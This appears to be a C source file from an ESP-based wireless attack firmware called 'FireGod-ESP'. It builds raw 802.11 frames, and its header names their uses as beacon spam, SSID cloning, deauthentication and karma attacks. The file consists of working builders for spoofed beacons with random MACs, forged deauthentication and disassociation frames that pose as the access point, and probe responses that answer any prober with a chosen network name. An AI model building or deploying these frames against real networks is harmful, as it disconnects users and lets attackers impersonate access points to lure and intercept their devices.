// ============================================================
// FireGod-ESP — 802.11 frame builders
// Standard frame layouts (frame-control, address fields, tagged
// parameters) per IEEE 802.11; used by beacon spam / SSID clone /
// deauth / karma. No code copied from reference firmware.
// ============================================================

#include "wifi_frames.h"
#include <esp_system.h>
#include <string.h>

// Supported-rates tag value (1,2,5.5,11,18,24,36,54 Mbps).
static const uint8_t RATES[] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};

void fg_rand_mac(uint8_t* mac) {
    esp_fill_random(mac, 6);
    mac[0] = (mac[0] & 0xFE) | 0x02;  // locally administered, unicast
}

int fg_build_beacon(uint8_t* buf, const char* ssid, const uint8_t* src,
                    uint8_t channel, bool privacy) {
    int n = 0;
    // --- MAC header (24B) ---
    buf[n++] = 0x80; buf[n++] = 0x00;                 // FC: mgmt/beacon
    buf[n++] = 0x00; buf[n++] = 0x00;                 // duration
    for (int i = 0; i < 6; i++) buf[n++] = 0xFF;      // dst: broadcast
    memcpy(buf + n, src, 6); n += 6;                  // src
    memcpy(buf + n, src, 6); n += 6;                  // BSSID
    buf[n++] = 0x00; buf[n++] = 0x00;                 // seq/frag (driver fills)
    // --- Fixed params (12B) ---
    memset(buf + n, 0, 8); n += 8;                    // timestamp
    buf[n++] = 0x64; buf[n++] = 0x00;                 // beacon interval 100 TU
    buf[n++] = privacy ? 0x11 : 0x01; buf[n++] = 0x04;// cap: ESS (+privacy)
    // --- Tagged: SSID ---
    uint8_t slen = (uint8_t)strlen(ssid);
    if (slen > 32) slen = 32;
    buf[n++] = 0x00; buf[n++] = slen;
    memcpy(buf + n, ssid, slen); n += slen;
    // --- Tagged: supported rates ---
    buf[n++] = 0x01; buf[n++] = sizeof(RATES);
    memcpy(buf + n, RATES, sizeof(RATES)); n += sizeof(RATES);
    // --- Tagged: DS parameter set (channel) ---
    buf[n++] = 0x03; buf[n++] = 0x01; buf[n++] = channel;
    // --- Tagged: minimal RSN (WPA2-PSK/CCMP) when privacy requested ---
    if (privacy) {
        static const uint8_t rsn[] = {
            0x30, 0x14, 0x01, 0x00,             // RSN tag, len 20, ver 1
            0x00, 0x0F, 0xAC, 0x04,             // group cipher CCMP
            0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, // pairwise CCMP
            0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02, // AKM PSK
            0x00, 0x00                          // RSN caps
        };
        memcpy(buf + n, rsn, sizeof(rsn)); n += sizeof(rsn);
    }
    return n;
}

int fg_build_deauth(uint8_t* buf, const uint8_t* bssid, const uint8_t* dst,
                    bool disassoc) {
    int n = 0;
    buf[n++] = disassoc ? 0xA0 : 0xC0; buf[n++] = 0x00; // FC: deauth/disassoc
    buf[n++] = 0x00; buf[n++] = 0x00;                   // duration
    memcpy(buf + n, dst, 6); n += 6;                    // dst
    memcpy(buf + n, bssid, 6); n += 6;                  // src = AP
    memcpy(buf + n, bssid, 6); n += 6;                  // BSSID
    buf[n++] = 0x00; buf[n++] = 0x00;                   // seq
    buf[n++] = 0x07; buf[n++] = 0x00;                   // reason: class-3 frame
    return n;
}

int fg_build_probe_resp(uint8_t* buf, const char* ssid, const uint8_t* src,
                        const uint8_t* dst, uint8_t channel) {
    int n = 0;
    buf[n++] = 0x50; buf[n++] = 0x00;                 // FC: probe response
    buf[n++] = 0x00; buf[n++] = 0x00;                 // duration
    memcpy(buf + n, dst, 6); n += 6;                  // dst (the prober)
    memcpy(buf + n, src, 6); n += 6;                  // src
    memcpy(buf + n, src, 6); n += 6;                  // BSSID
    buf[n++] = 0x00; buf[n++] = 0x00;                 // seq
    memset(buf + n, 0, 8); n += 8;                    // timestamp
    buf[n++] = 0x64; buf[n++] = 0x00;                 // interval
    buf[n++] = 0x01; buf[n++] = 0x04;                 // cap: ESS
    uint8_t slen = (uint8_t)strlen(ssid);
    if (slen > 32) slen = 32;
    buf[n++] = 0x00; buf[n++] = slen;
    memcpy(buf + n, ssid, slen); n += slen;
    buf[n++] = 0x01; buf[n++] = sizeof(RATES);
    memcpy(buf + n, RATES, sizeof(RATES)); n += sizeof(RATES);
    buf[n++] = 0x03; buf[n++] = 0x01; buf[n++] = channel;
    return n;
}
